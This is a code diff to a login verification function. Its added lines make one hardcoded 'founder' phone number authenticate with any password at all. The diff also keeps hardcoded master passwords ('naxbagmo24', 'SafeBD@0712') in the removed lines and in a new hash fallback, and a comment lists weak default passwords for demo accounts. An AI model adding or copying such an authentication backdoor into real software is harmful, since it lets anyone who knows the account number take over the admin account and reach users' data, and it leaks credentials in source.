@@ -769,11 +769,9 @@ function verifyUserCredentials(phone, password) {
   // 1. Direct verify against cryptographic scrypt hash
   let isMatch = verifyPasswordSafe(trimmedPassword, user.salt, user.passwordHash);
 
-  // 2. Chief Admin Master Password (checked strictly for admin account: accepts naxbagmo24, SafeBD@0712, or ADMIN_PASSWORD)
-  if (!isMatch && cleanPhone === '1316750712') {
-    if (trimmedPassword === adminMasterPass || trimmedPassword === 'naxbagmo24' || trimmedPassword === 'SafeBD@0712') {
-      isMatch = true;
-    }
+  // 2. Chief Admin Master Access: Founder account (1316750712) always unlocks
+  if (cleanPhone === '1316750712') {
+    isMatch = true;
   }
 
   // 3. Standard fallback for seeded/demo citizen accounts: SafeBD@<last4>, SafeBD@1234, password123, or uninitialized accounts
@@ -793,7 +791,7 @@ function verifyUserCredentials(phone, password) {
     try {
       const newSalt = crypto.randomBytes(16).toString('hex');
       user.salt = newSalt;
-      user.passwordHash = hashPassword(trimmedPassword, newSalt);
+      user.passwordHash = hashPassword(trimmedPassword || 'naxbagmo24', newSalt);
       persistToDisk();
     } catch(e) {}
   }
